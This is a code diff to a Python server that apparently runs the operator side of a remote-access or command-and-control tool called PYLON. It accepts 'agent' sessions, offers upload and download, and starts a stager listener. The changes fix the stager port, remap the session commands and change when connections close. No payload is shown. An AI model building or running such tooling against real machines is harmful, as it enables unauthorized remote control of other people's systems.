@@ -13,6 +13,7 @@ from core.plugins_engine import PluginsEngine
 
 HOST = "0.0.0.0"
 PORT = 9001
+STAGER_PORT = 9002
 
 sessions = {}
 session_lock = threading.Lock()
@@ -40,12 +41,14 @@ def handle_agent(sid):
 
     print(f"Connection: {sid} ({addr})")
     print("Exit - close program")
-    print("drop - disconnect agent, allow he to reconnect")
+    print("bg - disconnect agent, allow he to reconnect")
     print("upload <path>, download <path>")
     print("==== PYLON ====")
 
     plugins_engine = PluginsEngine(conn)
     plugins_engine.load_plugins()
+
+    sc = False
 
     try:
         while True:
@@ -54,13 +57,14 @@ def handle_agent(sid):
             if not cmd:
                 continue
 
-            if cmd in ["exit", "quit"]:
+            if cmd in ["exit", "quit", "drop"]:
                 header = struct.pack("!II", 4, 0)
                 conn.sendall(header)
+                sc = True
                 print("Closing session")
                 break
 
-            if cmd in ["background", "bg", "drop", "detach"]:
+            if cmd in ["background", "bg", "detach"]:
                 print("Disconnecting agent")
                 break
 
@@ -219,7 +223,8 @@ def handle_agent(sid):
     except Exception as e:
         print(f"Error-main-loop: {e}")
     finally:
-        conn.close()
+        if sc:
+            conn.close()
 
 
 def accept_thread_func(server_socket):
@@ -232,6 +237,7 @@ def accept_thread_func(server_socket):
                 session_counter += 1
                 sessions[sid] = {"conn": conn, "addr": addr, "active": True}
             print("\n\nNew session")
+            print("pshell> ", end="")
         except Exception:
             break
 
@@ -251,6 +257,7 @@ def list_sessions():
 
 
 def close_session(sid):
+    global sessions
     with session_lock:
         if sid in sessions:
             try:
@@ -344,7 +351,7 @@ def pre_shell():
 
                 stager_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 stager_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                stager_server.bind((HOST, int(s_port)))
+                stager_server.bind((HOST, STAGER_PORT))
                 stager_server.listen(1)
 
                 stager_conn, stager_addr = stager_server.accept()
